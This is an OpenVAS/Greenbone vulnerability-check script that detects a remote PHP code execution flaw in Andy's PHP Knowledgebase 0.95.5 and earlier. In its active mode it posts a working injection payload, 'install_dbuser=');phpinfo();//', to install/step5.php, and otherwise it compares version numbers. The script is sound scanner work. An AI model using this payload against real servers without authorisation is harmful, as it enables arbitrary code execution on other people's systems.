# Copyright (C) 2011 Greenbone Networks GmbH
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-or-later
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.

CPE = "cpe:/a:aphpkb:aphpkb";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.902519");
  script_version("2022-04-28T13:38:57+0000");
  script_tag(name:"last_modification", value:"2022-04-28 13:38:57 +0000 (Thu, 28 Apr 2022)");
  script_tag(name:"creation_date", value:"2011-06-01 11:16:16 +0200 (Wed, 01 Jun 2011)");
  script_tag(name:"cvss_base", value:"9.7");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:C/A:C");
  script_name("Andy's PHP Knowledgebase 'step5.php' Remote PHP Code Execution Vulnerability");
  script_category(ACT_MIXED_ATTACK);
  script_copyright("Copyright (C) 2011 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("secpod_aphpkb_detect.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("aphpkb/installed");

  script_xref(name:"URL", value:"http://downloads.securityfocus.com/vulnerabilities/exploits/47918.txt");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/47918");

  script_tag(name:"impact", value:"Successful exploitation could allow remote attackers to execute
  arbitrary PHP code within the context of the affected web server process.");

  script_tag(name:"affected", value:"Andy's PHP Knowledgebase version 0.95.5 and prior.");

  script_tag(name:"insight", value:"The flaw is caused by improper validation of user-supplied
  input passed via the 'install_dbuser' parameter to 'step5.php', that allows
  attackers to execute arbitrary PHP code.");

  script_tag(name:"solution", value:"Upgrade to version 0.95.6 or later.");

  script_tag(name:"summary", value:"Andy's PHP Knowledgebase is prone to remote PHP code execution vulnerability.");

  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"qod_type", value:"remote_active");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");
include("version_func.inc");
include("misc_func.inc");

if(!port = get_app_port(cpe:CPE))
  exit(0);

if(!infos = get_app_version_and_location(cpe:CPE, port:port, exit_no_version:FALSE))
  exit(0);

path = infos['location'];

## Not a safe check
if(!safe_checks()) {

  url = string(path, "/install/step5.php");
  data = "install_dbuser=');phpinfo();//&submit=Continue";

  req = http_post_put_req(port:port, url:url, data:data, add_headers:make_array("Content-Type", "application/x-www-form-urlencoded"));
  res = http_keepalive_send_recv(port:port, data:req);

  if(http_vuln_check(port:port, url:url, pattern:'>phpinfo()<', extra_check: make_list('>System <', '>Configuration<', '>PHP Core<'))){
    report = http_report_vuln_url(port:port, url:url);
    security_message(port:port, data:report);
    exit(0);
  }
}

vers = infos['version'];
if(!vers)
  exit(0);

if(version_is_less_equal(version:vers, test_version:"0.95.5")){
  report = report_fixed_ver(installed_version:vers, fixed_version:"0.95.6", install_path:path);
  security_message(port:port, data:report);
  exit(0);
}

exit(99);
